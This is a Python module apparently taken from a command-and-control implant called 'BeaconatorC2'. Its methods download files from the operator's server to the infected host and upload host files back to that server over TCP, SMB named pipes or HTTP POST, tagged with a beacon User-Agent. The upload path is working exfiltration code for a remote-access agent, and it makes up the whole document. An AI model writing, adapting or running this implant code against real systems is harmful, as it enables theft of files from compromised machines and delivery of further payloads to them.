    # File Transfer module - Upload and download files

    def download_file(self, filename):
        """Download file from server"""
        if self.protocol == "udp":
            return "ERROR: File transfer not supported over UDP"

        try:
            message = f"to_beacon|{filename}"

            if self.protocol == "tcp":
                sock = self.send_message(message, expect_response=True, is_file_transfer=True)
                if isinstance(sock, str) and sock.startswith("ERROR"):
                    return sock

                # Receive file data
                file_data = b""
                while True:
                    chunk = sock.recv(8192)
                    if not chunk:
                        break
                    file_data += chunk
                sock.close()

            elif self.protocol == "smb":
                pipe_handle = self.send_message(message, expect_response=True, is_file_transfer=True)
                if isinstance(pipe_handle, str) and pipe_handle.startswith("ERROR"):
                    return pipe_handle

                file_data = b""
                if os.name == 'nt':
                    while True:
                        try:
                            chunk = os.read(pipe_handle, 8192)
                            if not chunk:
                                break
                            file_data += chunk
                        except:
                            break
                    os.close(pipe_handle)
                else:
                    with open(f"/tmp/beaconator_c2_pipes/{self.pipe_name}", 'rb') as pipe:
                        file_data = pipe.read()

            elif self.protocol == "http":
                response = self.send_message(message, expect_response=True, is_file_transfer=True)
                if isinstance(response, str) and response.startswith("ERROR"):
                    return response

                file_data = response.read()
                response.close()

            # Save file
            downloads_dir = Path.home() / "Downloads" / "beacon_downloads"
            downloads_dir.mkdir(exist_ok=True)

            file_path = downloads_dir / filename
            with open(file_path, 'wb') as f:
                f.write(file_data)

            return f"File downloaded: {file_path} ({len(file_data)} bytes)"

        except Exception as e:
            return f"ERROR downloading file: {e}"

    def upload_file(self, filename):
        """Upload file to server"""
        if self.protocol == "udp":
            return "ERROR: File transfer not supported over UDP"

        try:
            file_path = Path(filename)
            if not file_path.exists():
                return f"ERROR: File not found: {filename}"

            message = f"from_beacon|{file_path.name}"

            if self.protocol == "tcp":
                sock = self.send_message(message, expect_response=True, is_file_transfer=True)
                if isinstance(sock, str) and sock.startswith("ERROR"):
                    return sock

                # Wait for READY response
                ready_response = sock.recv(1024).decode('utf-8').strip()
                if ready_response != "READY":
                    sock.close()
                    return f"ERROR: Server not ready: {ready_response}"

                # Send file data
                with open(file_path, 'rb') as f:
                    while True:
                        chunk = f.read(8192)
                        if not chunk:
                            break
                        sock.send(chunk)

                response = sock.recv(1024).decode('utf-8').strip()
                sock.close()
                return response

            elif self.protocol == "smb":
                pipe_handle = self.send_message(message, expect_response=True, is_file_transfer=True)
                if isinstance(pipe_handle, str) and pipe_handle.startswith("ERROR"):
                    return pipe_handle

                with open(file_path, 'rb') as f:
                    file_data = f.read()

                if os.name == 'nt':
                    os.write(pipe_handle, file_data)
                    response = os.read(pipe_handle, 1024).decode('utf-8').strip()
                    os.close(pipe_handle)
                else:
                    with open(f"/tmp/beaconator_c2_pipes/{self.pipe_name}", 'wb') as pipe:
                        pipe.write(file_data)
                    response = "SUCCESS"

                return response

            elif self.protocol == "http":
                url = f"http://{self.server_ip}:{self.server_port}{self.http_endpoint}"

                with open(file_path, 'rb') as f:
                    file_data = f.read()

                upload_message = f"{message}".encode('utf-8') + b"|" + file_data
                req = urllib.request.Request(url, data=upload_message, method='POST')
                req.add_header('Content-Type', 'application/octet-stream')
                req.add_header('User-Agent', f'BeaconatorC2-Beacon/{self.agent_id}')

                with urllib.request.urlopen(req, timeout=60) as response:
                    response_data = response.read().decode('utf-8').strip()
                    return response_data

        except Exception as e:
            return f"ERROR uploading file: {e}"
